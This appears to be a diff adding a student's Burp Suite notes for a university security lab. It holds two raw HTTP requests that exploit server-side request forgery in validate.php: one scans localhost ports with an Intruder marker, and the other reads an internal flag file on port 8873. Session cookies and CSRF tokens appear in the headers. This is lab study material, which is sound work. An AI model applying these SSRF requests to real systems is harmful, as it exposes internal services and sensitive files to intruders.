@@ -1,0 +1,25 @@
+
+//code copy from burpsuite
+GET /validate.php?web=http://127.0.0.1:§1§/ HTTP/1.1
+Host: assignment-code-warriors.unimelb.life
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=ji6nai1ifjvutokrpee3egt4kb; CSRF_token=Ngne08KBKtK6n0sS1idKYJjr2B1BRGxlMXnO9K9MSmu2TrIAoGYRUW0CLSuCMg2e
+Connection: close
+
+//port 8873 find useful information
+//Traverse internal system files
+
+//code form burpsuite
+GET /validate.php?web=http://127.0.0.1:8873/documents/background-checks/sensitive/flag.txt HTTP/1.1
+Host: assignment-code-warriors.unimelb.life
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+Accept: */*
+Referer: http://assignment-code-warriors.unimelb.life/profile.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=i7l7meapjs50kafhukhcddqj68; CSRF_token=C86ZeUHN35WopYczmj7ydXfHlWRGBmXcAlokyE3zrXtNxdwC4cacg2P9TOqvSl0j
+Connection: close
